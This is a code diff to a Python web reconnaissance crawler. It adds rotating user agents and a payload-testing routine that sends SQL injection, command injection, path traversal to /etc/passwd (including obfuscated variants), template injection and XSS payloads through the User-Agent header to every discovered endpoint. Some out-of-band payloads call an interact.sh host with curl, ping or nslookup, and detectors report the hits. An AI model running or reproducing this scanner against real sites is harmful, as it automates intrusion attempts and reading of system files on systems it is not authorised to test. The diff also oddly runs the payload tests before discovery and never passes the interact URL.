@@ -18,14 +18,20 @@ from colorama import Fore, Back, Style, init
 import pickle
 import hashlib
 from typing import Optional
+import random
 
 init(autoreset=True)
 
 # =========================
 # =========================
-USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64) Chrome/120 Safari/537.36"
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) Firefox/116.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) Safari/605.1.15",
+]
 TIMEOUT = 10
-MAX_HTML_PAGES = 50
+MAX_HTML_PAGES = 51
 MAX_CONCURRENCY = 40
 MAX_ROUTE_LIMIT = 1000 
 IGNORE_EXT = (
@@ -43,6 +49,74 @@ ENDPOINT_REGEX = re.compile(
     r'(["\'`])((?:/|\.\./|\./|https?:\/\/)[^"\'`\s]+(?:\.(?:js|json|php|bak|txt|xml|html|css|py|rb|asp|aspx|jsp|sql|db|zip|tar|gz|7z|rar|log|conf|config|ini|yaml|yml|toml|env|htaccess|htpasswd|git|svn|cvs|bak|~|old|backup|swp|tmp|temp|swo|swp|bak1|bak2|bak3))?)(\?.*)?\1',
     re.I
 )
+
+USER_PAYLOADS = {
+    "sql_time": [
+        "' AND SLEEP(5)--",
+        "'; WAITFOR DELAY '0:0:5'--",
+        "';%20waitfor%20delay%20'0:0:5'%20--%20",
+        "'XOR(if(now()=sysdate(),sleep(5),0))XOR'",
+        ";(SELECT(1)FROM(SELECT(SLEEP(5)))a)",
+        "';SELECT PG_SLEEP(5)--",
+        "0\"XOR(if(now()=system(),sleep(9),0))XOR\""
+    ],
+
+    "rce_output": [
+        "$(id)",
+        "`id`",
+        ";id;",
+        "|id|",
+        "echo pwned123",
+        "zerodiumsystem('id')",
+        "<%= Runtime.getRuntime().exec('id') %>",
+        "{php}echo id;{/php}"
+    ],
+
+    "rce_time": [
+        "sleep 5",
+        ";sleep 5;",
+        "zerodiumsleep(5)"
+    ],
+
+    "rce_oob": [
+        "<?php system('curl URLINTERACT.SH'); ?>",
+        "$(ping -c 5 URLINTERACT.SH)",
+        "<?php system('nslookup URLINTERACT.SH'); ?>"
+    ],
+
+    "lfi_passwd": [
+        "../../../../../../etc/passwd",
+        "../../../../../../e*c/p*s*d",
+        "{php}print \"root:\"{/php}",
+        "{{'/etc/passwd'|file_excerpt(1,30)}}@",
+        "e\c\h\o$IFS-s$IFS'\x63\x61\x74\x20\x2F\x65\x74\x63\x2F\x70\x61\x73\x73\x77\x64'|/???/\b**\h",
+        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
+    ],
+
+    "lfi_environ": [
+        "/proc/self/environ"
+    ],
+
+    "lfi_windows": [
+        "..\\..\\..\\windows\\win.ini"
+    ],
+
+    "template": [
+        "{{7*7}}",
+        "${7*7}",
+        "#{7*7}",
+        "@(7*7)",
+        "{{ '7'*7 }}"
+    ],
+
+    "xss": [
+        "<script>alert(1)</script>",
+        "<sCriPt x>(((alert(1))))``</scRipt x>"
+    ]
+}
+
+
+
 DYNAMIC_PATTERNS = re.compile(r'/(:[^/]+|\{[^}]+\}|\$\{[^}]+\})')
 REACT_ROUTE_KEYS = ("path", "to", "href")
 REACT_ROUTE_FUNCS = ("navigate", "push", "replace", "Link", "useNavigate")
@@ -1331,6 +1405,106 @@ async def extract_from_json(data: Any, base: str, client: httpx.AsyncClient, sta
                     await state.add_endpoint(ep, "json-extract")
 
 # =========================
+# PAYLOAD TESTING
+# =========================
+async def test_payloads(client: httpx.AsyncClient, state: State, interact_url=None):
+
+    DETECTORS = {
+        "sql_time": lambda r, text: r.elapsed.total_seconds() >= 5,
+
+        "rce_output": lambda r, text: any(x in text for x in [
+            "uid=", "gid=", "groups=", "pwned123"
+        ]),
+
+        "rce_time": lambda r, text: r.elapsed.total_seconds() >= 5,
+
+        "lfi_passwd": lambda r, text: any(x in text for x in [
+            "root:x", "/bin/bash"
+        ]),
+
+        "lfi_environ": lambda r, text: any(x in text for x in [
+            "http_user_agent", "document_root", "path="
+        ]),
+
+        "lfi_windows": lambda r, text: "16-bit app support" in text,
+
+        "template": lambda r, text: "49" in text,
+
+        "xss": lambda r, text, payload=None: payload and payload.lower() in text
+    }
+
+    for ep_url, ep_data in state.endpoints.items():
+
+        if ep_data.get("status") not in (200, 403):
+            continue
+
+        for payload_type, payload_list in USER_PAYLOADS.items():
+
+            for raw_payload in payload_list:
+
+                payload = raw_payload
+
+                if interact_url and "URLINTERACT.SH" in payload:
+                    payload = payload.replace("URLINTERACT.SH", interact_url)
+
+                headers = {
+                    "User-Agent": payload
+                }
+
+                try:
+                    async with state.semaphore:
+
+                        if not state.can_request():
+                            return
+
+                        state.register_request()
+
+                        r = await client.get(
+                            ep_url,
+                            headers=headers,
+                            timeout=TIMEOUT
+                        )
+
+
+                    full_response = (
+                        str(r.headers) +
+                        "\n" +
+                        r.text
+                    ).lower()
+
+                    show = False
+                    snippet = ""
+
+                    detector = DETECTORS.get(payload_type)
+
+                    if detector:
+
+                        if payload_type == "xss":
+                            show = detector(r, full_response, payload)
+                        else:
+                            show = detector(r, full_response)
+
+                    if show:
+
+                        snippet = full_response[:300].replace("\n", " ")
+
+                        if payload_type in ["sql_time", "rce_time"]:
+                            snippet = f"Response time: {r.elapsed.total_seconds():.2f}s"
+
+                        print(
+                            f"{Fore.GREEN}[{payload_type.upper()}]"
+                            f" User-Agent Payload: {payload} -> {ep_url}"
+                        )
+
+                        print(
+                            f"{Fore.YELLOW}Snippet: {snippet}{Style.RESET_ALL}\n"
+                        )
+
+                except Exception as e:
+                    log_err(f"Error testing payload {payload} on {ep_url} : {e}")
+
+
+# =========================
 # MAIN
 # =========================
 async def main(args):
@@ -1345,6 +1519,8 @@ async def main(args):
     max_requests = args.max_requests
     route_limit = args.route_limit
     historical = not args.no_historical
+    interact_url = args.interact
+
 
     state = State(max_requests, directory_focused, route_limit)
     state.base_netloc = urlparse(target).netloc
@@ -1352,7 +1528,19 @@ async def main(args):
     js_engine = JSAnalyzer(target, allow_sub, state)
     crawler = HTMLCrawler(target, allow_sub, js_engine, state)
 
-    async with httpx.AsyncClient(headers={"User-Agent": USER_AGENT}, follow_redirects=True, timeout=TIMEOUT) as client:
+    async with httpx.AsyncClient(follow_redirects=True) as client:
+        await get_home_metrics(client, target, state)
+        await analyze_endpoints(state)
+
+        for url in state.endpoints.keys():
+            await validate_url(client, url, state, verbose=True)
+
+        print(f"{Fore.CYAN}[+] Testing payloads...{Style.RESET_ALL}")
+        await test_payloads(client, state)
+
+    
+
+    async with httpx.AsyncClient(headers={"User-Agent": random.choice(USER_AGENTS)}, follow_redirects=True, timeout=TIMEOUT) as client:
         log_progress("Starting Discovery Phase...")
         await crawler.crawl(client)
         if historical:
@@ -1490,10 +1678,11 @@ def stop_signal(sig, frame):
     global state
     if state is not None:
         state.stop = True
-    print("\n[!] Interrumpido por el usuario")
+    print("\n[X] Interrumpido por el usuario")
     sys.exit(0)
 
 signal.signal(signal.SIGINT, stop_signal)
+
 
 
 if __name__ == "__main__":
@@ -1507,5 +1696,6 @@ if __name__ == "__main__":
     parser.add_argument("--max-requests", type=int, default=500000, help="Max HTTP requests")
     parser.add_argument("--route-limit", type=int, default=MAX_ROUTE_LIMIT, help="Max routes to collect")
     parser.add_argument("--js", type=str, help="Save collected JS URLs to a file")
+    parser.add_argument("--interact", type=str, help="url of interact.sh")
     args = parser.parse_args()
     asyncio.run(main(args))
